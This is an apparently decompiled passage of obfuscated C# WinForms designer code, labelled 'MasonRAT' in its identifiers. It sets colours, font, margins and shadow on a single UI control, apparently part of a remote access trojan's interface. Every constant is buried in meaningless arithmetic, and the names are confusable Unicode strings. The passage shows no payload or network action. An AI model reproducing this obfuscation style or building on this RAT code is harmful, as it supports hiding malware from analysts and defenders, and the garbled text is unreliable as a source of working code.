- -0 ^ 0) << ((1724516511 ^ 1296808823 >> 665230782) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.DisabledState.PlaceholderForeColor = Color.FromArgb((2006688524 + 1566070096 % 487377010 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 ^ (587673706 + 372891409 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 | 1084011242 + (1769945979 >> 41942499) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (-714569220 - 813896740 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - ~(-1362323807 - 1404177393 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), ((466991554 > 186178306 ? -372191007 : -496254676) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ^ ~(1101931570 + ~729740454 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Dock = (DockStyle) ((-535331385 - 426109742 % 490813837 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - ~(-1757521306 - (32202862 | 1560775926) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.FillColor = Color.FromArgb((83427776 - 83427769 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + (1832383005 - (1095689325 | 37689489) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 >> (1640403638 - 929132797 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1), (11258037 | 376229718) - 563633987 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + ((351297729 ^ 509144999 % 813772749) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, ((1011264601 + -607318173 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) > (-894975830 - 1989807105 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) ? 369576614 - 1815006642 % 481810028 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 : (232282581 ^ 748623292 % 516340669) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.FocusedState.BorderColor = Color.FromArgb(((1523054589 > 1830611334 ? 1116521498 : 837391124) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) - ((2003582847 ^ 1183165876 % 1482575257) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) % (1396134464 + (128923771 | 53132909) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), (-2066861250 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + ((456864633 > 1531595459 ? -1539152203 : 2066861320) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, (89444832 - 80080543 % 948836810 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ 1319263608 - 719939099 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 >> (-2015440612 - (730153560 >> 1009824674) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.FocusedState.FillColor = Color.FromArgb(((528365208 > 978516421 ? 1415504498 : 1061628374) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 > (1886737796 - (980408989 >> 462344740) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) ? 1396676550 - 1396676514 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 : 1778384923 - (1571554922 << 789194072) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, (1202168228 - 566783781 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - (2084515411 - (1179830506 | 1380954916) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), (-923724611 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + ((937787370 ^ 1732802444 % 1717363492) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 250), 12f, FontStyle.Regular, (GraphicsUnit) ((-1867195980 - (770881219 << 520799558) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 > (106192271 > 279665610 ? 524890706 : 393668030) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ? (468289521 > 299656289 ? 4 : 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 : 396884344 + ~396884340 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0), (byte) 0);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.HoverState.BorderColor = Color.FromArgb((926597184 - (893042150 | 906016646) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ 1300760856 - 1300760837 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, (1611757598 - (98518058 | 986000401) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 > 976449058 + ~604929013 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ? (1863088203 | 976290774) - 2134735779 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 : (-1251717437 ^ ~1251717484) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0, (1328675026 - 893786863 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ ((-370167100 ^ -535991621) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 | -2107841996 - 1896975644 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Location = new Point(0, 508);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Margin = new Padding((7731 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - ((-1119554558 ^ 617537303 << 820488470) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 >> ((20166740 ^ 921904049 >> 1019542235) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), (1504041319 - 892546900 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 > (1808504969 - 1732423221 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) ? (-1299073691 ^ ~1299073694) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 : (9 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 509961675 - 391375214 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 - ((160448001 ^ 809299632 % 442965829) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 >> (630657114 + ~622406839 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, 4);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 251);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.PasswordChar = char.MinValue;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.PlaceholderText = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 252);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.SelectedText = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 253);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.ShadowDecoration.BorderRadius = (1896538068 > 2064856928 ? 1524062280 : -2078178762) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + (2135444063 - 1677080017 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 | 2108039409 - 1786262802 % 451204556 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0;
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.ShadowDecoration.Color = Color.FromArgb((239254369 ^ 8) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - ((239254317 ^ 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, (268437830 + (224630038 >> 2012989497) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) - (559025450 - 290587674 % 1580039325 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) % ((678538151 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, ((-314731953 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + (1450545629 - 1135813511 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0));
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.ShadowDecoration.Depth = (99820375 - 1504846659 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - (1855411880 + (1990616783 >> 986801270) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 << (644909626 << 2071770940) - 970622225 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0;
